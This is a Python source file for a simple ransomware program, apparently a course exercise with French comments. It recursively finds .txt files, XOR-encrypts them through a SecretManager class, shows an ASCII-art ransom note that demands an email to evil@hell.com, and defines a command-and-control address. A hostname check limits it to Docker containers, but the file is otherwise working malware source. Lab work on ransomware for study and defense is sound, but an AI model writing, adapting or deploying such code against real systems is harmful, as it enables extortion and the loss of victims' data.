import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
import os


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter: str) -> list:
        # Récupérer tous les fichiers dont l'extension correspond au filtre
        path = Path('.')  # Crée un objet path à partir du repertoire courant
        #rglob cherche les fichiers correspondant a str
        return [str(file.resolve()) for file in path.rglob(f'*{filter}')] #retourne lz liste de chemins sous forme de chaines de caractère

    def encrypt(self) -> None:
        # On vien ici lister les fichiers .txt
        txt_files = list(Path('.').rglob('*.txt'))  

        if not txt_files:
            print("Pas de .txt trouvé à chiffrer.")
            return

        secret_manager = SecretManager()
        secret_manager.setup()  # cette methode nous permet de sauvegarder les éléments

        secret_manager.xorfiles([str(file) for file in txt_files]) #chiffrer les fichiers txt trouvés

        # Affichage du message en hexadécimal
        hex_token = secret_manager.get_hex_token()
        print(f" Voici le token: {hex_token}")

    def decrypt(self) -> None:
        secret_manager = SecretManager()
        secret_manager.load()  # On charge le sel et le jeton

        # Lister les fichiers chiffrés
        encrypted_files = list(Path('.').rglob('*.txt'))  

        if not encrypted_files:
            print("Aucun fichier chiffré trouvé.")
            return

        while True:
            try:
                # Demander la clé à l'utilisateur
                b64_key = input("Entrer la clé de déchiffrement: ")
                
                # valider la cle avec setkey
                secret_manager.set_key(b64_key)

                # Déchiffrer les fichiers avec le xorfile
                secret_manager.xorfiles([str(file) for file in encrypted_files])

                # Nettoyer les éléments locaux
                secret_manager.clean()

                print("Tous les fichiers ont été déchiffrés avec succès.")
                break  

            except ValueError as e:
                print(f"Erreur : {e}. Veuillez réessayer.")  

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()